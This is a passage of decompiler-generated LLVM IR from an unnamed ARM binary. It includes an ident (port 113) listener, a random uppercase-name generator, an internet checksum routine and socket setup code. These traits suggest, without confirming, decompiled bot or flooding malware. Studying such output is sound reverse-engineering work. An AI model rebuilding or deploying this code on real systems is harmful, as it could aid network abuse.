; uselistorder directives
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_84c812, { 1, 0 }
  uselistorder i32 %v1_846c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8524, { 2, 0, 1 }
  uselistorder label %dec_label_pc_84dc, { 1, 0 }
  uselistorder label %dec_label_pc_8484, { 1, 0 }
}

define i32 @function_8548() local_unnamed_addr {
dec_label_pc_8548:
  %v2_855c = load i8*, i8** @global_var_20640.33, align 4
  %v3_855c = ptrtoint i8* %v2_855c to i32
  %v2_8560 = icmp eq i8* %v2_855c, null
  br i1 %v2_8560, label %dec_label_pc_8568, label %dec_label_pc_8578

dec_label_pc_8568:                                ; preds = %dec_label_pc_8548
  %v0_8568 = call i32 @function_10364()
  br label %dec_label_pc_85e4

dec_label_pc_8578:                                ; preds = %dec_label_pc_8548
  %v2_857c = load i32, i32* @global_var_20644.35, align 4
  %v7_8580 = icmp eq i32 %v2_857c, 1
  br i1 %v7_8580, label %dec_label_pc_8588, label %dec_label_pc_85a0

dec_label_pc_8588:                                ; preds = %dec_label_pc_8578
  %v2_8594 = call i32 @function_f5a8(i32 %v3_855c)
  br label %dec_label_pc_85e4

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8578
  %v0_85a0 = call i32 @function_10364()
  %v2_85b0 = load i32, i32* @global_var_20644.35, align 4
  %v2_85bc = call i32 @function_ca30(i32 %v0_85a0, i32 %v2_85b0)
  %v2_85cc = load i8*, i8** @global_var_20640.33, align 4
  %v3_85cc = ptrtoint i8* %v2_85cc to i32
  %v2_85d0 = add i32 %v2_85bc, 1
  %v1_85d4 = add i32 %v2_85d0, %v3_85cc
  %v1_85dc = call i32 @function_f5a8(i32 %v1_85d4)
  br label %dec_label_pc_85e4

dec_label_pc_85e4:                                ; preds = %dec_label_pc_8588, %dec_label_pc_8568, %dec_label_pc_85a0
  %v3_85e4 = phi i32 [ %v2_8594, %dec_label_pc_8588 ], [ %v0_8568, %dec_label_pc_8568 ], [ %v1_85dc, %dec_label_pc_85a0 ]
  ret i32 %v3_85e4

; uselistorder directives
  uselistorder i32 (i32)* @function_f5a8, { 1, 0 }
  uselistorder label %dec_label_pc_85e4, { 2, 0, 1 }
}

define i32 @function_85f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_85f8:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85f8, i32* @ip, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8610:                                ; preds = %dec_label_pc_865c, %dec_label_pc_8634
  %v3_8610 = phi i32 [ %v3_866c, %dec_label_pc_865c ], [ %v3_8644, %dec_label_pc_8634 ]
  store i32 %v3_8610, i32* @r0, align 4
  %v0_8614 = call i32 @function_f030()
  %v3_8620 = load i32, i32* %stack_var_-20, align 4
  %v2_8624 = add i32 %v0_8614, -1
  %v1_8628 = add i32 %v2_8624, %v3_8620
  %v3_8630 = inttoptr i32 %v1_8628 to i8*
  store i8 0, i8* %v3_8630, align 1
  %v3_8634.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8634:                                ; preds = %dec_label_pc_85f8, %dec_label_pc_8610
  %v3_8634 = phi i32 [ %arg1, %dec_label_pc_85f8 ], [ %v3_8634.pre, %dec_label_pc_8610 ]
  store i32 %v3_8634, i32* @r0, align 4
  %v0_8638 = call i32 @function_f030()
  %v3_8644 = load i32, i32* %stack_var_-20, align 4
  %v2_8648 = add i32 %v0_8638, -1
  %v1_864c = add i32 %v2_8648, %v3_8644
  %v1_8650 = inttoptr i32 %v1_864c to i8*
  %v2_8650 = load i8, i8* %v1_8650, align 1
  %v7_8654 = icmp eq i8 %v2_8650, 13
  br i1 %v7_8654, label %dec_label_pc_8610, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8634
  store i32 %v3_8644, i32* @r0, align 4
  %v0_8660 = call i32 @function_f030()
  %v3_866c = load i32, i32* %stack_var_-20, align 4
  %v2_8670 = add i32 %v0_8660, -1
  %v1_8674 = add i32 %v2_8670, %v3_866c
  %v1_8678 = inttoptr i32 %v1_8674 to i8*
  %v2_8678 = load i8, i8* %v1_8678, align 1
  %v7_867c = icmp eq i8 %v2_8678, 10
  br i1 %v7_867c, label %dec_label_pc_8610, label %dec_label_pc_8684

dec_label_pc_8684:                                ; preds = %dec_label_pc_865c
  ret i32 %v0_8660

; uselistorder directives
  uselistorder i32 %v3_866c, { 1, 0 }
  uselistorder i32 %v3_8644, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8634, { 1, 0 }
}

define i32 @function_8688() local_unnamed_addr {
dec_label_pc_8688:
  %stack_var_-1064 = alloca i32, align 4
  %v3_868c = load i32, i32* @r4, align 4
  %v6_868c = load i32, i32* @fp, align 4
  %v2_8698 = ptrtoint i32* %stack_var_-1064 to i32
  %v0_869c = call i32 @function_10364()
  %v2_86ac = call i32 @function_cafc(i32 %v0_869c, i32 5)
  %v1_86b4 = add i32 %v2_86ac, 4
  %v1_86c0 = add i32 %v2_86ac, 5
  %v1_86c8 = call i32 @function_fc78(i32 %v1_86c0)
  store i32 %v1_86c0, i32* @r2, align 4
  %v2_86ec = inttoptr i32 %v1_86c8 to i8*
  %v3_86ec = call i32 @function_ef70(i8* %v2_86ec, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_15c98.37 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15ca8.39 to i32), i32* @r1, align 4
  %v3_86f8 = call i32 @function_d050(i32 ptrtoint ([16 x i8]* @global_var_15c98.37 to i32), i32 ptrtoint (i32* @global_var_15ca8.39 to i32))
  %v2_8708 = icmp eq i32 %v3_86f8, 0
  br i1 %v2_8708, label %dec_label_pc_8760.preheader, label %dec_label_pc_8774

dec_label_pc_8760.preheader:                      ; preds = %dec_label_pc_8688
  %v5_876c22 = icmp sgt i32 %v1_86b4, 0
  br i1 %v5_876c22, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_871c:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c
  %storemerge323 = phi i32 [ %v1_8758, %dec_label_pc_871c ], [ 0, %dec_label_pc_8760.preheader ]
  %v2_8728 = add i32 %storemerge323, %v1_86c8
  store i32 %v2_8728, i32* @r4, align 4
  %v0_872c = call i32 @function_10364()
  %v2_873c = call i32 @function_cafc(i32 %v0_872c, i32 26)
  %fold = add i32 %v2_873c, 65
  %v1_8750 = trunc i32 %fold to i8
  %v2_8750 = load i32, i32* @r4, align 4
  %v3_8750 = inttoptr i32 %v2_8750 to i8*
  store i8 %v1_8750, i8* %v3_8750, align 1
  %v1_8758 = add nuw nsw i32 %storemerge323, 1
  %v5_876c = icmp slt i32 %v1_8758, %v1_86b4
  br i1 %v5_876c, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_8774:                                ; preds = %dec_label_pc_8688
  %v0_8774 = call i32 @function_10364()
  store i32 %v0_8774, i32* @r4, align 4
  %v0_877c = call i32 @function_10364()
  %v0_8784 = load i32, i32* @r4, align 4
  %v2_8784 = mul i32 %v0_8784, %v0_877c
  %v2_8794 = call i32 @function_cafc(i32 %v2_8784, i32 45402)
  %v1_879c = add i32 %v2_8794, 1
  %v5_87e030 = icmp sgt i32 %v1_879c, 0
  br i1 %v5_87e030, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87b0:                                ; preds = %dec_label_pc_8774, %dec_label_pc_87b0
  %storemerge231 = phi i32 [ %v1_87cc, %dec_label_pc_87b0 ], [ 0, %dec_label_pc_8774 ]
  %v3_87c4 = call i32 @function_e7bc(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_87cc = add nuw nsw i32 %storemerge231, 1
  %v5_87e0 = icmp slt i32 %v1_87cc, %v1_879c
  br i1 %v5_87e0, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87b0, %dec_label_pc_8774
  store i32 1024, i32* @r2, align 4
  %v2_87f8 = bitcast i32* %stack_var_-1064 to i8*
  %v3_87f8 = call i32 @function_ef70(i8* %v2_87f8, i32 0)
  %v3_8810 = call i32 @function_e7bc(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_8820 = call i32 @function_85f8(i32 %v2_8698)
  store i32 %v1_86c8, i32* @r0, align 4
  store i32 %v2_8698, i32* @r1, align 4
  store i32 %v1_86b4, i32* @r2, align 4
  %v0_8844 = call i32 @function_ef60()
  %v1_884c = inttoptr i32 %v3_86f8 to i8*
  %v2_884c = call i32 @function_ced0(i8* %v1_884c)
  br label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c, %dec_label_pc_87e4
  store i32 %v3_868c, i32* @r4, align 4
  store i32 %v6_868c, i32* @fp, align 4
  ret i32 %v1_86c8

; uselistorder directives
  uselistorder i32 %v1_87cc, { 1, 0 }
  uselistorder i32 %v1_879c, { 1, 0 }
  uselistorder i32 %v1_8758, { 1, 0 }
  uselistorder i32 %v1_86c8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_86b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87b0, { 1, 0 }
  uselistorder label %dec_label_pc_871c, { 1, 0 }
}

define i32 @function_8868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8868:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8868 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8868, i32* @ip, align 4
  %v3_886c = load i32, i32* @fp, align 4
  store i32 %v3_886c, i32* %stack_var_-16, align 4
  store i32 34932, i32* %stack_var_-4, align 4
  %v13_886c = ptrtoint i32* %stack_var_-16 to i32
  %v2_8870 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8870, i32* @fp, align 4
  %v3_8888 = call i32 @function_fc4c(i32 2, i32 1, i32 0)
  %v7_8898 = icmp eq i32 %v3_8888, -1
  br i1 %v7_8898, label %dec_label_pc_8c38, label %dec_label_pc_88a0

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8868
  store i32 2, i32* %stack_var_-60, align 4
  %v1_88b4 = call i32 @function_f604(i32 113)
  %sext = mul i32 %v1_88b4, 16777216
  %v1_88b8 = sdiv i32 %sext, 16777216
  %v2_88d0 = ptrtoint i32* %stack_var_-60 to i32
  %v10_88f8 = ashr i32 %sext, 31
  %v11_88f8 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v12_88f8 = call i32 @function_fb38(i32 %v3_8888, %sockaddr* %v11_88f8, i32 16, i32 %v2_88d0, i32 %v1_88b8, i32 %v10_88f8, i32 0, i32 0, i32 0)
  %v7_8900 = icmp eq i32 %v12_88f8, -1
  br i1 %v7_8900, label %dec_label_pc_8c38, label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88a0
  %v2_8910 = call i32 @function_fb90(i32 %v3_8888, i32 1)
  %v7_8918 = icmp eq i32 %v2_8910, -1
  br i1 %v7_8918, label %dec_label_pc_8c38, label %dec_label_pc_8920

dec_label_pc_8920:                                ; preds = %dec_label_pc_8908
  %v0_8920 = call i32 @function_cc10()
  %v2_8928 = icmp eq i32 %v0_8920, 0
  br i1 %v2_8928, label %dec_label_pc_8c38, label %dec_label_pc_8930

dec_label_pc_8930:                                ; preds = %dec_label_pc_8920
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8938 = ptrtoint i32* %stack_var_-76 to i32
  %v2_893c = ptrtoint i32* %stack_var_-44 to i32
  %v5_8948 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v6_8948 = call i32 @function_fb0c(i32 %v3_8888, %sockaddr* %v5_8948, i32 %v2_893c, i32 %v2_8938, i32 16)
  %v2_8958 = add i32 %v6_8948, 1
  %v3_8958 = icmp eq i32 %v6_8948, -1
  br i1 %v3_8958, label %dec_label_pc_8960, label %dec_label_pc_8968.preheader

dec_label_pc_8960:                                ; preds = %dec_label_pc_8930
  %v1_8964 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8968.preheader

dec_label_pc_8968.preheader:                      ; preds = %dec_label_pc_8960, %dec_label_pc_8930
  %v2_8970 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_89b0 = udiv i32 %v6_8948, 32
  %v3_89c4 = mul nuw nsw i32 %v3_89b0, 4
  %v2_89cc = add i32 %v3_89c4, %v13_886c
  %v1_89dc = urem i32 %v6_8948, 32
  %v6_89e4 = shl i32 1, %v1_89dc
  %v2_8a34 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8a80 = add i32 %v2_89cc, -1220
  %v1_8a84 = inttoptr i32 %v2_8a80 to i32*
  br label %dec_label_pc_8984.lr.ph

dec_label_pc_8984.lr.ph:                          ; preds = %dec_label_pc_8a64, %dec_label_pc_8968.preheader
  br label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8984.lr.ph, %dec_label_pc_8984
  %storemerge28 = phi i32 [ 0, %dec_label_pc_8984.lr.ph ], [ %v1_8998, %dec_label_pc_8984 ]
  %v5_8990 = mul nuw nsw i32 %storemerge28, 4
  %v6_8990 = add i32 %v5_8990, %v2_8970
  %v7_8990 = inttoptr i32 %v6_8990 to i32*
  store i32 0, i32* %v7_8990, align 4
  %v1_8998 = add nuw nsw i32 %storemerge28, 1
  %tmp38 = icmp ult i32 %v1_8998, 32
  br i1 %tmp38, label %dec_label_pc_8984, label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8984
  %v2_89d4 = load i32, i32* %v1_8a84, align 4
  %v2_89e8 = or i32 %v2_89d4, %v6_89e4
  store i32 %v2_89e8, i32* %v1_8a84, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8a4c = call i32 @function_ce00(i32 %v2_8958, i32 %v2_8970, i32 0, i32 0, i32 %v2_8a34)
  %v1_8a54 = icmp slt i32 %v5_8a4c, 0
  br i1 %v1_8a54, label %dec_label_pc_8a5c, label %dec_label_pc_8a64

dec_label_pc_8a5c:                                ; preds = %dec_label_pc_89ac
  %v1_8a60 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8a64

dec_label_pc_8a64:                                ; preds = %dec_label_pc_89ac, %dec_label_pc_8a5c
  %v2_8a84 = load i32, i32* %v1_8a84, align 4
  %v6_8a901 = lshr i32 %v2_8a84, %v1_89dc
  %v1_8a98 = urem i32 %v6_8a901, 2
  %v2_8a9c = icmp eq i32 %v1_8a98, 0
  br i1 %v2_8a9c, label %dec_label_pc_8984.lr.ph, label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a64
  %v2_8ab0 = ptrtoint i32* %stack_var_-1100 to i32
  %v5_8ac4 = call i32 @function_fbbc(i32 %v6_8948, i32* nonnull %stack_var_-1100, i32 1024, i32 0)
  %tmp39 = icmp slt i32 %v5_8ac4, 1
  br i1 %tmp39, label %dec_label_pc_8ae8, label %dec_label_pc_8adc

dec_label_pc_8adc:                                ; preds = %dec_label_pc_8aa8
  %v7_8ae4 = icmp slt i32 %v5_8ac4, 20
  br i1 %v7_8ae4, label %dec_label_pc_8af0, label %dec_label_pc_8ae8

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8aa8
  %v1_8aec = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8af0

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8ae8
  %v2_8b00 = add i32 %v13_886c, -1084
  %v2_8b04 = add i32 %v2_8b00, %v5_8ac4
  %v3_8b0c = inttoptr i32 %v2_8b04 to i8*
  store i8 0, i8* %v3_8b0c, align 1
  %v1_8b14 = add i32 %v13_886c, -1
  %v2_8b24 = add i32 %v1_8b14, %v5_8ac4
  %v2_8b28 = add i32 %v2_8b24, -1084
  %v1_8b2c = inttoptr i32 %v2_8b28 to i8*
  %v2_8b2c = load i8, i8* %v1_8b2c, align 1
  %v7_8b30 = icmp eq i8 %v2_8b2c, 10
  br i1 %v7_8b30, label %dec_label_pc_8b60, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8af0
  %v2_8b54 = load i8, i8* %v1_8b2c, align 1
  %v7_8b58 = icmp eq i8 %v2_8b54, 13
  br i1 %v7_8b58, label %dec_label_pc_8b60, label %dec_label_pc_8b84

dec_label_pc_8b60:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8af0
  store i8 0, i8* %v1_8b2c, align 1
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8b60
  %v1_8b88 = add i32 %v13_886c, -2
  %v2_8b98 = add i32 %v1_8b88, %v5_8ac4
  %v2_8b9c = add i32 %v2_8b98, -1084
  %v1_8ba0 = inttoptr i32 %v2_8b9c to i8*
  %v2_8ba0 = load i8, i8* %v1_8ba0, align 1
  %v7_8ba4 = icmp eq i8 %v2_8ba0, 10
  br i1 %v7_8ba4, label %dec_label_pc_8bd4, label %dec_label_pc_8bac

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b84
  %v2_8bc8 = load i8, i8* %v1_8ba0, align 1
  %v7_8bcc = icmp eq i8 %v2_8bc8, 13
  br i1 %v7_8bcc, label %dec_label_pc_8bd4, label %dec_label_pc_8bf8

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8b84
  store i8 0, i8* %v1_8ba0, align 1
  br label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8bd4
  store i32 %v2_8ab0, i32* @r2, align 4
  %v3_8c1c = call i32 @function_8374(i32 %v6_8948, i32 ptrtoint ([25 x i8]* @global_var_15cac.43 to i32))
  %v1_8c24 = call i32 @function_cbe4(i32 %v6_8948)
  %v1_8c2c = call i32 @function_cbe4(i32 %v3_8888)
  %v1_8c34 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8c38

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8920, %dec_label_pc_8908, %dec_label_pc_88a0, %dec_label_pc_8868, %dec_label_pc_8bf8
  %v9_8c3c = phi i32 [ 0, %dec_label_pc_8920 ], [ %v2_8910, %dec_label_pc_8908 ], [ %v12_88f8, %dec_label_pc_88a0 ], [ %v3_8888, %dec_label_pc_8868 ], [ %v1_8c34, %dec_label_pc_8bf8 ]
  ret i32 %v9_8c3c

; uselistorder directives
  uselistorder i8* %v1_8ba0, { 1, 0, 2 }
  uselistorder i8* %v1_8b2c, { 1, 0, 2 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder i32* %v1_8a84, { 2, 0, 1 }
  uselistorder i32 %v1_89dc, { 1, 0 }
  uselistorder i32 %v2_8970, { 1, 0 }
  uselistorder i32 %v6_8948, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8910, { 1, 0 }
  uselistorder i32 %v12_88f8, { 1, 0 }
  uselistorder i32 %v3_8888, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_886c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_8c38, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_8af0, { 1, 0 }
  uselistorder label %dec_label_pc_8a64, { 1, 0 }
  uselistorder label %dec_label_pc_8984, { 1, 0 }
}

define i32 @function_8c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8c48:
  %stack_var_-4 = alloca i32, align 4
  store i32 35924, i32* %stack_var_-4, align 4
  %v2_8c50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8c50, i32* @fp, align 4
  %v2_8c64 = icmp eq i32 %arg2, 0
  br i1 %v2_8c64, label %dec_label_pc_8c6c, label %dec_label_pc_8c78

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c48
  br label %dec_label_pc_8cb4

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c48
  %v7_8c7c = icmp eq i32 %arg2, 1
  br i1 %v7_8c7c, label %dec_label_pc_8c84, label %dec_label_pc_8c90

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c78
  br label %dec_label_pc_8cb4

dec_label_pc_8c90:                                ; preds = %dec_label_pc_8c78
  %v1_8c7c = add i32 %arg2, -1
  %v2_8ca0 = call i32 @function_8c48(i32 %arg1, i32 %v1_8c7c)
  %v2_8cac = mul i32 %v2_8ca0, %arg1
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c84, %dec_label_pc_8c6c, %dec_label_pc_8c90
  %v3_8cb4 = phi i32 [ %arg1, %dec_label_pc_8c84 ], [ 1, %dec_label_pc_8c6c ], [ %v2_8cac, %dec_label_pc_8c90 ]
  ret i32 %v3_8cb4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cb4, { 2, 0, 1 }
}

define i32 @function_8cc4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8cc4:
  %stack_var_0 = alloca i32, align 4
  %v1_8cc4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8cc4, i32* @ip, align 4
  %v8_8d4010 = icmp sgt i32 %arg2, 1
  br i1 %v8_8d4010, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d04:                                ; preds = %dec_label_pc_8cc4, %dec_label_pc_8d04
  %v3_8d2c = phi i32 [ %v1_8d30, %dec_label_pc_8d04 ], [ %arg2, %dec_label_pc_8cc4 ]
  %stack_var_-36.012 = phi i8* [ %v5_8d28, %dec_label_pc_8d04 ], [ %arg1, %dec_label_pc_8cc4 ]
  %stack_var_-32.011 = phi i32 [ %v2_8d18, %dec_label_pc_8d04 ], [ 0, %dec_label_pc_8cc4 ]
  %v4_8d04 = ptrtoint i8* %stack_var_-36.012 to i32
  %v2_8d08 = load i8, i8* %stack_var_-36.012, align 1
  %v3_8d08 = zext i8 %v2_8d08 to i32
  %v1_8d0c = add i32 %v4_8d04, 1
  %v2_8d0c = inttoptr i32 %v1_8d0c to i8*
  %v3_8d0c = load i8, i8* %v2_8d0c, align 1
  %v4_8d0c = zext i8 %v3_8d0c to i32
  %v4_8d10 = mul nuw nsw i32 %v4_8d0c, 256
  %v5_8d10 = or i32 %v4_8d10, %v3_8d08
  %v2_8d18 = add i32 %v5_8d10, %stack_var_-32.011
  %v1_8d24 = add i32 %v4_8d04, 2
  %v5_8d28 = inttoptr i32 %v1_8d24 to i8*
  %v1_8d30 = add nsw i32 %v3_8d2c, -2
  %v8_8d40 = icmp sgt i32 %v1_8d30, 1
  br i1 %v8_8d40, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d04, %dec_label_pc_8cc4
  %v3_8d44 = phi i32 [ %arg2, %dec_label_pc_8cc4 ], [ %v1_8d30, %dec_label_pc_8d04 ]
  %stack_var_-32.0.lcssa = phi i32 [ 0, %dec_label_pc_8cc4 ], [ %v2_8d18, %dec_label_pc_8d04 ]
  %stack_var_-36.0.lcssa = phi i8* [ %arg1, %dec_label_pc_8cc4 ], [ %v5_8d28, %dec_label_pc_8d04 ]
  %v7_8d48 = icmp eq i32 %v3_8d44, 1
  br i1 %v7_8d48, label %dec_label_pc_8d50, label %dec_label_pc_8d7c

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d44
  %v2_8d58 = load i8, i8* %stack_var_-36.0.lcssa, align 1
  %v3_8d64 = sext i8 %v2_8d58 to i32
  %v2_8d74 = add i32 %v3_8d64, %stack_var_-32.0.lcssa
  br label %dec_label_pc_8d7c

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8d44, %dec_label_pc_8d50
  %stack_var_-32.1 = phi i32 [ %v2_8d74, %dec_label_pc_8d50 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8d44 ]
  %v3_8d80 = sdiv i32 %stack_var_-32.1, 65536
  %v3_8d8c = urem i32 %stack_var_-32.1, 65536
  %v2_8d90 = add nsw i32 %v3_8d80, %v3_8d8c
  %v3_8d9c = sdiv i32 %v2_8d90, 65536
  %v2_8da4 = add nsw i32 %v3_8d9c, %v2_8d90
  %v2_8da4.not = or i32 %v2_8da4, -65536
  %v1_8db8 = xor i32 %v2_8da4.not, 65535
  %v3_8dd02 = and i32 %v1_8db8, 65280
  %sext = mul i32 %v1_8db8, 16777216
  %v3_8ddc = sdiv i32 %sext, 16777216
  %v5_8de4 = or i32 %v3_8ddc, %v3_8dd02
  ret i32 %v5_8de4

; uselistorder directives
  uselistorder i32 %v2_8d90, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8d30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8d7c, { 1, 0 }
  uselistorder label %dec_label_pc_8d04, { 1, 0 }
}

define i32 @function_8df4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8df4:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-5200 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_8df8 = load i32, i32* @r4, align 4
  store i32 %v3_8df8, i32* %stack_var_-20, align 4
  store i32 36352, i32* %stack_var_-4, align 4
  %v16_8df8 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8dfc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8dfc, i32* @fp, align 4
  %v3_8e14 = add i32 %v16_8df8, -5184
  %v4_8e14 = inttoptr i32 %v3_8e14 to i32*
  store i32 %arg1, i32* %v4_8e14, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-5216, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v1_8e58 = call i32 @function_83d8(i32 %arg2)
  %v2_8e60 = icmp eq i32 %v1_8e58, 0
  br i1 %v2_8e60, label %dec_label_pc_8e68, label %dec_label_pc_9530

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8df4
  %v8_8e7c = icmp sgt i32 %arg3, 1
  br i1 %v8_8e7c, label %dec_label_pc_8eb0, label %dec_label_pc_8e80

dec_label_pc_8e80:                                ; preds = %dec_label_pc_8e68
  %v4_8e94 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_15cc8.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ea4 = call i32 @function_8374(i32 %v4_8e94, i32 ptrtoint ([33 x i8]* @global_var_15cc8.45 to i32))
  %v1_8eac = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8eb0

dec_label_pc_8eb0:                                ; preds = %dec_label_pc_8e68, %dec_label_pc_8e80
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8ebc = call i32 @function_fc4c(i32 2, i32 1, i32 0)
  %v3_8ecc = icmp eq i32 %v3_8ebc, -1
  br i1 %v3_8ecc, label %dec_label_pc_8ed4, label %dec_label_pc_8f04

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8eb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_8ee8 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([37 x i8]* @global_var_15cec.47 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ef8 = call i32 @function_8374(i32 %v4_8ee8, i32 ptrtoint ([37 x i8]* @global_var_15cec.47 to i32))
  %v1_8f00 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8f04

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8eb0, %dec_label_pc_8ed4
  %v4_8f10 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f14 = add i32 %v4_8f10, 4
  %v1_8f18 = inttoptr i32 %v1_8f14 to i32*
  %v2_8f18 = load i32, i32* %v1_8f18, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15d14.49 to i32), i32* @r1, align 4
  %v4_8f28 = inttoptr i32 %v2_8f18 to i8*
  %v5_8f28 = call i32 @function_f0ac(i8* %v4_8f28, i32 ptrtoint ([8 x i8]* @global_var_15d14.49 to i32), i32 7)
